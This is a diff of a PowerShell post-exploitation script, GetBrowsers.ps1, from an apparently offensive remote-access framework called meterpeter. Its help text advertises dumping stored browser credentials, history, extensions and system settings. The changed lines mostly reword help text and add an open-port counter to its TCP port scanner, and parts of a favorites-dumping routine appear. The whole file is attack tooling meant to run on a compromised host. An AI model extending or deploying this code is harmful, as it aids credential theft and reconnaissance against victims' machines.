@@ -67,8 +67,8 @@
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
-    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome.exe
+    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
@@ -80,6 +80,7 @@
 #  [Parameter(Mandatory=$true,Position=0)]$FIREFOX,
 #  [Parameter(Mandatory=$false,Position=1)][string]$LOGFILEPATH
 # )
+
 
 $Path = $null
 $mpset = $False
@@ -94,7 +95,7 @@ If(-not($param1)){
     echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
     echo "Syntax: [scriptname] [-arg <mandatory>] [arg <optional>]`n" >> $LogFilePath\BrowserEnum.log
     echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -RECON            Fast recon (browsers and versions)" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -RECON            Fast recon (browsers versions interface)" >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -WINVER           Enumerates remote sys default settings." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
@@ -103,7 +104,7 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates local|remote host open|closed tcp ports.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
@@ -342,7 +343,9 @@ function IE_Dump {
                 echo "`n" $Token >> $LogFilePath\BrowserEnum.log
             }        
         }
+
     }else{
+
         $LocalDirPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*"
         $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https" # Test.txt and test2.txt (test Files) ..
         ForEach ($Token in $DumpFileData){
@@ -898,6 +901,8 @@ function CREDS_DUMP {
 
  ## Function tcp port scanner
  function PORTSCANNER {
+ [int]$counter = 0
+
     If(-not($param2)){$PortRange = "21,22,23,80,135,137,139,443,445,666,1433,4444,8080"}else{$PortRange = $param2}
     $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
     echo "`n`nRemote-Host   Status   Port" >> $LogFilePath\BrowserEnum.log
@@ -905,10 +910,12 @@ function CREDS_DUMP {
     $PortRange -split(',')|Foreach-Object -Process {
         If((Test-NetConnection $Remote_Host -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){
             echo "$Remote_Host  Open     $_" >> $LogFilePath\BrowserEnum.log
+            $counter++
         }else{
             echo "$Remote_Host  Closed   $_" >> $LogFilePath\BrowserEnum.log
         }
     }
+    echo "`nTotal open ports found: $counter" >> $LogFilePath\BrowserEnum.log
 }
 
 
